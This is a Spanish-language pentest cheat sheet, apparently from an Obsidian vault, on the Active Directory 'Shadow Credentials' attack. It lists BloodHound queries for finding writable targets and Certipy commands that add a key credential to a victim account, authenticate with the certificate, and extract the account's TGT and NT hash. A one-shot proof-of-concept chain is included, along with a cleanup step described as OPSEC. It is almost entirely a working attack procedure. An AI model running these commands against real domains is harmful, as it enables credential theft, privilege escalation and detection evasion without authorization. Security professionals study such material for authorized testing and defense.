---
aliases:
  - Shadow Credentials Certipy
tags:
  - technique/privilege-escalation
  - technique/credential-access
  - asset/active-directory
  - env/windows
  - service/ad-cs
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[Shadow Credentials]]"
  - "[[Certipy]]"
  - "[[BloodHound & SharpHound]]"
---
# Shadow Credentials - Discovery y Certipy

> Variables: `ATK=attacker@corp.local`, `P=pass`, `VICTIM=VICTIM$`, `DC=10.10.10.10`. Requiere `GenericWrite`/`GenericAll`/`AddKeyCredentialLink` sobre el target + AD CS con template de client auth.

---

## Identificar Target (BloodHound)

| **Comando / Query** | **Qué obtenés** | **Cuándo** |
|:---|:---|:---|
| `MATCH p=(u {owned:true})-[:AddKeyCredentialLink]->(t) RETURN p` | Objetos sobre los que podés escribir KeyCredentialLink | Targeting directo. |
| `MATCH p=(u {owned:true})-[:GenericAll\|GenericWrite\|WriteDacl\|WriteOwner]->(t) RETURN p` | ACLs que permiten Shadow Credentials | Recon de rutas → [[BloodHound & SharpHound]]. |
^shadowcred-discovery

## Certipy (Linux)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---|:---|:---|
| `certipy shadow auto -u $ATK -p $P -account 'VICTIM$' -dc-ip $DC` | One-shot: add KCL + auth + **NT hash** + cleanup auto | Lo más usado. |
| `certipy shadow add -u $ATK -p $P -account 'VICTIM$' -dc-ip $DC` | Solo agrega el KCL → `VICTIM.pfx` | Control manual. |
| `certipy auth -pfx VICTIM.pfx -dc-ip $DC -username 'VICTIM$'` | TGT + NT hash desde el cert | Tras `add`. |
| `certipy shadow list -u $ATK -p $P -account 'VICTIM$' -dc-ip $DC` | Inspeccionar KeyCredentialLink existente | Recon del atributo. |
| `certipy shadow clear -u $ATK -p $P -account 'VICTIM$' -dc-ip $DC` | Borrar el KCL agregado | Cleanup (OPSEC). |
| `certipy shadow auto -u $ATK -hashes :NTHASH -account 'VICTIM$' -dc-ip $DC` | Igual usando PtH (sin password) | Tenés el hash del atacante. |
^shadowcred-certipy

### PoC auto chain

```bash
certipy shadow auto -u attacker@corp.local -p 'Pass123' -account 'VICTIM$' -dc-ip 10.10.10.10
# → "NT hash for 'VICTIM$': aad3b4...:NTHASH"  (KCL revertido automáticamente)
```

> Variante on-host Windows (Whisker) y vía relay: [[Shadow Credentials - Whisker y Relay]].
